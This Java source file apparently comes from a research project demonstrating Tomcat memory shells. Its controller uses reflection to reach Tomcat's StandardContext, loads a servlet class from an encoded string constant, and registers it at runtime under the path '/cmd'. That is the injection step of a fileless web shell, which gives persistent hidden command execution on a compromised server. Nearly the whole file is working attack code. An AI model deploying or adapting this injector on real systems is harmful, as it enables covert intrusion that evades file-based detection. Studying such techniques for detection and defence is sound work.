package com.example.tomcatmemshell.demos.web.addservlet;

import com.example.tomcatmemshell.utils.DynamicUtils;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoader;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;

import static com.example.tomcatmemshell.utils.DynamicUtils.FILTER_CLASS_STRING;
import static com.example.tomcatmemshell.utils.DynamicUtils.SERVLET_CLASS_STRING;


@Controller
public class AddServletController {


    @RequestMapping("/addservlet")
    @ResponseBody
    public String addservlet(HttpServletRequest req, HttpServletResponse resp) {
        try {

            // 从线程中获取类加载器WebappClassLoaderBase
            TomcatEmbeddedWebappClassLoader contextClassLoader = (TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            WebResourceRoot resource = (WebResourceRoot) getField(contextClassLoader,Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources"));
            Context context=  resource.getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            // 从Application中获取StandardService对象
            StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));

            // 从StandardService中获取Connector数组
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector : connectors) {
                if (connector.getScheme().toLowerCase().contains("http")) {
                    // 获取Connector对象的protocolHandler属性值
                    ProtocolHandler protocolHandler = connector.getProtocolHandler();
                    // 筛选我们需要的Abstract
                    if (protocolHandler instanceof AbstractProtocol) {
                        // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                        // 反射获取该方法
                        Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                        getHandler.setAccessible(true);
                        AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                        // 从上面获取的handler中取出global属性值
                        RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                        // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                        ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                        // 遍历List中的元素
                        for (Object processor : processors) {
                            RequestInfo requestInfo = (RequestInfo) processor;
                            // 获取对应的Request对象
                            org.apache.coyote.Request reqs = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) reqs.getNote(1);




                            String servletName = "su18Servlet";

                            // 从 request 中获取 servletContext
                            ServletContext servletContext = request.getServletContext();

                            // 如果已有此 servletName 的 Servlet，则不再重复添加
                            if (servletContext.getServletRegistration(servletName) == null) {

                                StandardContext o = null;

                                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                while (o == null) {
                                    Field f = servletContext.getClass().getDeclaredField("context");
                                    f.setAccessible(true);
                                    Object object = f.get(servletContext);

                                    if (object instanceof ServletContext) {
                                        servletContext = (ServletContext) object;
                                    } else if (object instanceof StandardContext) {
                                        o = (StandardContext) object;
                                    }
                                }

                                // 创建自定义 Servlet
                                Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);

                                // 使用 Wrapper 封装 Servlet
                                Wrapper wrapper = o.createWrapper();
                                wrapper.setName(servletName);
                                wrapper.setLoadOnStartup(1);
                                wrapper.setServlet((Servlet) servletClass.newInstance());
                                wrapper.setServletClass(servletClass.getName());

                                // 向 children 中添加 wrapper
                                o.addChild(wrapper);

                                // 添加 servletMappings
                                o.addServletMappingDecoded("/cmd", servletName);

                                return "tomcat servlet added";
                            }else{
                                return "tomcat servlet already added";
                            }


                        }
                    }
                }
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
        return "tomcat servlet add failed";
    }

    public static Object getField(Object obj, Field field){
        try{
            field.setAccessible(true);
            return field.get(obj);
        }catch (Exception e){

        }
        return null;
    }
}
